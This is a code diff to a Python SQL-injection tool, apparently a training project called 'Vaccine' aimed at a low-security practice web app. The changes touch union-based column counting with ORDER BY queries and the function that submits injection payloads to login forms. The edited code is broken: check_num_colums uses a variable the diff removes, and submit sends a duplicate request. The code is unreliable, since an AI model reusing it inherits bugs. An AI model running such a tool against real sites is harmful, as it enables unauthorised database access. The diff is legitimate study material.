@@ -8,7 +8,7 @@ from difflib import Differ
 REQUEST_TYPES = set(["get", "post"])
 
 token = os.environ.get('TOKEN')
-cookies = {'PHPSESSID': token}
+cookies = {'PHPSESSID': token, "security": "low"}
 
 def error_exit(msg):
 	print(f"Error: {msg}")
@@ -44,9 +44,7 @@ class Union:
 		self.original_text = self.submit("").text
 
 	def check_num_colums(self):
-		i = 3
-		q = f"ORDER BY {i}"
-		query = self.header + q + self.comment
+		query = self.delimiter + q + self.comment
 		res = self.submit(query)
 		print_diff(self.original_text, res.text)
 
@@ -126,19 +124,22 @@ class Vaccine:
 
 	def submit(self, password, username=""):
 		if self.username_field_name:
-			data = {
+			payload = {
 				self.username_field_name: username,
 				self.password_field_name: password
 			}
 		else:
-			data = {
-				self.password_field_name: password
+			payload = {
+				self.password_field_name: password,
+				"Submit" : "Submit"
 			}
-
+		res = requests.get(self.request_url, params=payload, cookies=cookies)
+		print(f'payload:{payload}')
 		if self.method == "get":
-			res = requests.get(self.request_url, data=data, cookies=cookies)
+			res = requests.get(self.request_url, params=payload, cookies=cookies)
+			print(res.url)
 		elif self.method == "post":
-			res = requests.post(self.request_url, data=data, cookies=cookies)
+			res = requests.post(self.request_url, data=payload, cookies=cookies)
 		return res
 
 	def vaccine(self):
